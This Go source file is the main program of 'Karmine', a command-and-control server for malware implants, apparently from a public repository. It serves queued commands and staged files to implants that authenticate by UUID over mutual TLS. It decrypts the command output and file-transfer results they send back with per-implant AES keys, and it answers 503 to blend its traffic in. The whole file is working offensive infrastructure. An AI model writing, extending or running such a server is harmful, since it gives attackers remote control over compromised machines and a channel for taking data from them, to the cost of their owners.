package main

import (
	"crypto/tls"
	"crypto/x509"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	"os"

	"github.com/alecthomas/kingpin"
	"github.com/gorilla/mux"
	"github.com/pygrum/karmine/config"
	"github.com/pygrum/karmine/datastore"
	"github.com/pygrum/karmine/kmdline"
	"github.com/pygrum/karmine/krypto/kes"
	"github.com/pygrum/karmine/models"
	log "github.com/sirupsen/logrus"
)

const (
	asciiTitle = "============================\n" +
		"█▄▀ ▄▀█ █▀█ █▀▄▀█ █ █▄░█ █▀▀\n" +
		"█░█ █▀█ █▀▄ █░▀░█ █ █░▀█ ██▄\n" +
		"============================\n" +
		"v1.0.0 - https://github.com/pygrum/karmine"
)

var (
	db      *datastore.Kdb
	fileMap = make(map[string]string)

	app  = kingpin.New(os.Args[0], "Karmine v1.0.0 - C2 / management server")
	host = app.Arg("host", "address to serve on").Required().String()
	port = app.Arg("port", "port to listen on").Default("443").String()
)

func main() {
	kingpin.MustParse(app.Parse(os.Args[1:]))
	if net.ParseIP(*host) == nil && *host != "localhost" {
		log.Fatalf("%s is not valid - provide a valid IP address or localhost", *host)
	}
	fileMap["1"] = "/tmp/cmdstage.tmp"
	fileMap["2"] = "/tmp/filestage.tmp"
	conf, err := config.GetFullConfig()
	if err != nil {
		log.Fatal(err)
	}
	certfile, keyfile, err := config.GetSSLPair()
	if err != nil {
		log.Error(err)
	}
	srv, err := newMTLSServer(certfile)
	if err != nil {
		log.Error(err)
	}
	r := mux.NewRouter()
	r.HandleFunc(conf.Endpoint, simpleHandler)
	srv.Handler = r
	srv.Addr = *host + ":" + *port
	fmt.Println(asciiTitle)
	kl, err := kmdline.Kmdline("$ ")
	if err != nil {
		log.Fatal(err)
	}
	db, err = datastore.New("karmine")
	if err != nil {
		log.Fatal(err)
	}
	bytes, err := json.Marshal(&models.TmpConf{
		LHost:    *host,
		LPort:    *port,
		Endpoint: conf.Endpoint,
	})
	if err != nil {
		log.Fatal(err)
	}
	if err = os.WriteFile("/tmp/karmine.tmp", bytes, 0644); err != nil {
		log.Fatal(err)
	}
	go func() {
		log.Fatal(srv.ListenAndServeTLS(certfile, keyfile))
	}()
	log.Fatal(kl.Read())
}

func simpleHandler(w http.ResponseWriter, r *http.Request) {
	uuid := r.Header.Get("X-UUID")
	if !db.UUIDExists(uuid) {
		w.WriteHeader(503)
		return
	}
	if r.Method == http.MethodGet {
		handleGet(w, r)
	} else if r.Method == http.MethodPost {
		handlePost(w, r)
	}
}

func handleGet(w http.ResponseWriter, r *http.Request) {
	t := r.URL.Query().Get("t")
	if len(t) == 0 {
		log.Warn("could not find parameter 't' in request")
		w.WriteHeader(503)
		return
	}
	contentFile, ok := fileMap[t]
	if !ok {
		log.Warn("invalid type %d supplied as parameter 't' in request", t)
		w.WriteHeader(503)
		return
	}
	bytes, err := os.ReadFile(contentFile)
	if err != nil {
		log.Error(err)
		w.WriteHeader(503)
		return
	}
	w.Write(bytes)
}

func handlePost(w http.ResponseWriter, r *http.Request) {
	defer r.Body.Close()
	body, _ := ioutil.ReadAll(r.Body)
	genericData := &models.GenericData{}
	if err := json.Unmarshal(body, genericData); err != nil {
		log.Error(err)
		w.WriteHeader(503)
		return
	}
	switch genericData.Type {
	case 1:
		var obj []byte
		var err error
		if len(genericData.UUID) != 0 {
			aeskey, x1, x2 := db.GetKeysByUUID(r.Header.Get("X-UUID"))
			obj, err = kes.DecryptObject(genericData.Object, aeskey, x1, x2)
			if err != nil {
				log.Error(err)
				w.WriteHeader(503)
				return
			}
		} else {
			obj = genericData.Object
		}
		cmdResponse := &models.KarResponseObjectCmd{}

		if err := json.Unmarshal(obj, &cmdResponse); err != nil {
			log.Error(err)
			w.WriteHeader(503)
			return
		}
		uid := r.Header.Get("X-UUID")
		cmd := db.GetCmdByID(genericData.CmdID)
		name, err := datastore.GetNameByUUID(uid)
		if err != nil {
			log.Error(err)
		}
		if cmdResponse.Code == 1 {
			log.Error(fmt.Errorf("$%s$: error executing '%s'", name, cmd))
			w.WriteHeader(503)
			return
		}
		logResponse(cmdResponse, cmd, name, uid, r.RemoteAddr)
		if err = db.DeleteCmdByID(genericData.CmdID); err != nil {
			if err.Error() != "no rows affected" {
				log.Errorf("failed to delete command with id %d: %v", genericData.CmdID, err)
				return
			}
		}
		w.WriteHeader(503)
	case 2:
		var obj []byte
		var err error
		if len(genericData.UUID) != 0 {
			aeskey, x1, x2 := db.GetKeysByUUID(r.Header.Get("X-UUID"))
			obj, err = kes.DecryptObject(genericData.Object, aeskey, x1, x2)
			if err != nil {
				log.Error(err)
				w.WriteHeader(503)
				return
			}
		} else {
			obj = genericData.Object
		}
		fileObj := &models.KarResponseObjectFile{}
		if err := json.Unmarshal(obj, fileObj); err != nil {
			log.Error(err)
			w.WriteHeader(503)
			return
		}
		if fileObj.Error != 0 {
			n, err := datastore.GetNameByUUID(r.Header.Get("X-UUID"))
			if err != nil {
				log.Error(err)
			}
			fmt.Printf("%% %s %% %s ---\n", n, r.RemoteAddr)
			log.WithField("status", "error").Error(fileObj.ErrVal)
		}
		w.WriteHeader(503)
	}
}

func logResponse(resp *models.KarResponseObjectCmd, cmd, name, uid, addr string) {
	if len(cmd) == 0 {
		return
	}
	fmt.Printf("%% %s %% %s---\n", name, addr)
	log.WithField("status", "success").Info(cmd)
	if len(resp.Data.Error) != 0 {
		log.WithField("status", "error").Info(resp.Data.Error)
		return
	}
	log.Info(resp.Data.Result)
	fmt.Println("---")
}

func newMTLSServer(certFile string) (*http.Server, error) {
	caCert, err := ioutil.ReadFile(certFile)
	if err != nil {
		return nil, err
	}
	caCertPool := x509.NewCertPool()
	caCertPool.AppendCertsFromPEM(caCert)

	tlsConfig := &tls.Config{
		ClientCAs:  caCertPool,
		ClientAuth: tls.RequireAndVerifyClientCert,
	}

	return &http.Server{
		TLSConfig: tlsConfig,
	}, nil
}
